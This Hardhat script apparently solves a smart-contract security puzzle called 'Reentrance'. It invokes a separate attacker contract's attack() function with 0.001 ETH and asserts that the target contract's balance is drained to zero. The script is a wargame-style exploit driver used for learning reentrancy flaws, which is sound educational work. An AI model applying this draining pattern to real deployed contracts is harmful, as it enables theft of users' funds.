// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import contractAddresses from "../constants/contractAddresses.json";
import assert from "assert";

const PLAYER_ADDRESS = contractAddresses.Player;
const CONTRACT_ADDRESS = contractAddresses.Reentrance;
const REENTRANCE_ATTACKER = contractAddresses.ReentranceAttacker;

async function main() {
    console.log(
        "Script to solve Reentrance puzzle \n ========================================== \n"
    );

    const attacker = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Reentrance", CONTRACT_ADDRESS, attacker);
    const attackerContract = await ethers.getContractAt(
        "ReentranceAttacker",
        REENTRANCE_ATTACKER,
        attacker
    );

    const initialBalance = await ethers.provider.getBalance(contract.address);
    console.log("Initial balance of contract:       ", initialBalance.toString());

    await attackerContract.attack({ value: ethers.utils.parseEther("0.001") });

    const balanceOfContractAfterAttack = await ethers.provider.getBalance(contract.address);
    const formattedBalance = ethers.utils.formatEther(balanceOfContractAfterAttack);
    console.log("Balance of contract after attack:  ", formattedBalance.toString(), "ETH");

    assert(balanceOfContractAfterAttack.eq(0), "Contract should have no funds after attack");
    console.log("Contract has no funds after attack, you can submit the solution now");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
